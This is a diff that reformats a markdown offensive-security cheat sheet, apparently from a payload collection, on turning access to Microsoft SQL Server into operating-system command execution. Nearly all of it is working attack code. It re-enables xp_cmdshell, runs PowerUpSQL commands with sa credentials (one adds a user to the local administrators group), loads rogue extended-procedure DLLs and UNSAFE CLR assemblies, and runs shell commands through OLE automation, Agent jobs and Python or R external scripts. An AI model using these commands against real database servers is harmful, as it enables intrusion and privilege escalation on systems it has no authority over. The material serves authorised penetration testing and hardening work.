@@ -17,7 +17,6 @@
     - [Python](#python)
     - [R](#r)
 
-
 ## Command Execution via xp_cmdshell
 
 > xp_cmdshell disabled by default since SQL Server 2005
@@ -30,25 +29,29 @@ PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSE
 PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
 ```
 
-* Manually execute the SQL query
-	```sql
-	EXEC xp_cmdshell "net user";
-	EXEC master..xp_cmdshell 'whoami'
-	EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
-	EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
-	```
-* If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
-	```sql
-	EXEC sp_configure 'show advanced options',1;
-	RECONFIGURE;
-	EXEC sp_configure 'xp_cmdshell',1;
-	RECONFIGURE;
-	```
-* If the procedure was uninstalled
-	```sql
-	sp_addextendedproc 'xp_cmdshell','xplog70.dll'
-	```
+- Manually execute the SQL query
 
+ ```sql
+ EXEC xp_cmdshell "net user";
+ EXEC master..xp_cmdshell 'whoami'
+ EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+ EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+ ```
+
+- If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
+
+ ```sql
+ EXEC sp_configure 'show advanced options',1;
+ RECONFIGURE;
+ EXEC sp_configure 'xp_cmdshell',1;
+ RECONFIGURE;
+ ```
+
+- If the procedure was uninstalled
+
+ ```sql
+ sp_addextendedproc 'xp_cmdshell','xplog70.dll'
+ ```
 
 ## Extended Stored Procedure
 
@@ -66,26 +69,25 @@ Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInst
 Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 ```
 
-* Build a DLL using [xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp)
-* Load the DLL
-	```sql
-	-- can also be loaded from UNC path or Webdav
-	sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
-	EXEC xp_calc
-	sp_dropextendedproc 'xp_calc'
-	```
+- Build a DLL using [xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp)
+- Load the DLL
 
+ ```sql
+ -- can also be loaded from UNC path or Webdav
+ sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
+ EXEC xp_calc
+ sp_dropextendedproc 'xp_calc'
+ ```
 
 ## CLR Assemblies
 
 Prerequisites:
 
-* sysadmin privileges
-* CREATE ASSEMBLY permission (or)
-* ALTER ASSEMBLY permission (or)
+- sysadmin privileges
+- CREATE ASSEMBLY permission (or)
+- ALTER ASSEMBLY permission (or)
 
 The execution takes place with privileges of the **service account**.
-
 
 ### Execute commands using CLR assembly
 
@@ -101,7 +103,6 @@ Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\
 # List all the stored procedures added using CLR
 Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
 ```
-
 
 ### Manually creating a CLR DLL and importing it
 
@@ -153,38 +154,49 @@ public partial class StoredProcedures
 Then follow these instructions:
 
 1. Enable `show advanced options` on the server
-	```sql
-	sp_configure 'show advanced options',1; 
-	RECONFIGURE
-	GO
-	```
+
+    ```sql
+    sp_configure 'show advanced options',1; 
+    RECONFIGURE
+    GO
+    ```
+
 2. Enable CLR on the server
-	```sql
-	sp_configure 'clr enabled',1
-	RECONFIGURE
-	GO
-	```
+
+    ```sql
+    sp_configure 'clr enabled',1
+    RECONFIGURE
+    GO
+    ```
+
 3. Trust the assembly by adding its SHA512 hash
-   ```sql
-	EXEC sys.sp_add_trusted_assembly 0x[SHA512], N'assembly';
-   ```
+
+    ```sql
+    EXEC sys.sp_add_trusted_assembly 0x[SHA512], N'assembly';
+    ```
+
 4. Import the assembly
-	```sql
-	CREATE ASSEMBLY my_assembly
-	FROM 'c:\temp\cmd_exec.dll'
-	WITH PERMISSION_SET = UNSAFE;
-	```
+
+    ```sql
+    CREATE ASSEMBLY my_assembly
+    FROM 'c:\temp\cmd_exec.dll'
+    WITH PERMISSION_SET = UNSAFE;
+    ```
+
 5. Link the assembly to a stored procedure
-	```sql
-	CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
-	GO
-	```
+
+    ```sql
+    CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
+    GO
+    ```
+
 6. Execute and clean
-	```sql
-	cmd_exec "whoami"
-	DROP PROCEDURE cmd_exec
-	DROP ASSEMBLY my_assembly
-	```
+
+ ```sql
+ cmd_exec "whoami"
+ DROP PROCEDURE cmd_exec
+ DROP ASSEMBLY my_assembly
+ ```
 
 **CREATE ASSEMBLY** will also accept an hexadecimal string representation of a CLR DLL
 
@@ -195,12 +207,10 @@ WITH PERMISSION_SET = UNSAFE
 GO 
 ```
 
-
 ## OLE Automation
 
-* :warning: Disabled by default
-* The execution takes place with privileges of the **service account**.
-
+- :warning: Disabled by default
+- The execution takes place with privileges of the **service account**.
 
 ### Execute commands using OLE automation procedures
 
@@ -221,7 +231,6 @@ EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
 EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
 ```
 
-
 ```powershell
 # https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
 python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
@@ -231,13 +240,10 @@ SQL> enable_ole
 SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 ```
 
-
 ## Agent Jobs
 
-* The execution takes place with privileges of the **SQL Server Agent service account** if a proxy account is not configured.
-* :warning: Require **sysadmin** or **SQLAgentUserRole**, **SQLAgentReaderRole**, and **SQLAgentOperatorRole** roles to create a job.
-
-
+- The execution takes place with privileges of the **SQL Server Agent service account** if a proxy account is not configured.
+- :warning: Require **sysadmin** or **SQLAgentUserRole**, **SQLAgentReaderRole**, and **SQLAgentOperatorRole** roles to create a job.
 
 ### Execute commands through SQL Agent Job service
 
@@ -261,7 +267,6 @@ EXEC dbo.sp_start_job N'test_powershell_job1';
 EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
 ```
 
-
 ### List All Jobs
 
 ```ps1
@@ -270,19 +275,17 @@ SELECT job.job_id, notify_level_email, name, enabled, description, step_name, co
 Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
 ```
 
-
 ## External Scripts
 
 Requirements:
 
-* Feature 'Advanced Analytics Extensions' must be installed
-* Enable **external scripts**.
+- Feature 'Advanced Analytics Extensions' must be installed
+- Enable **external scripts**.
 
 ```sql
 sp_configure 'external scripts enabled', 1;
 RECONFIGURE;
 ```
-
 
 ### Python
 
@@ -292,7 +295,6 @@ Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNA
 EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
 WITH RESULT SETS (([cmd_out] nvarchar(max)))
 ```
-
 
 ### R
 
@@ -306,10 +308,7 @@ GO
 @script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
 ```
 
-
-
-
 ## References
 
-* [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
-* [MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)
+- [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
+- [MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)
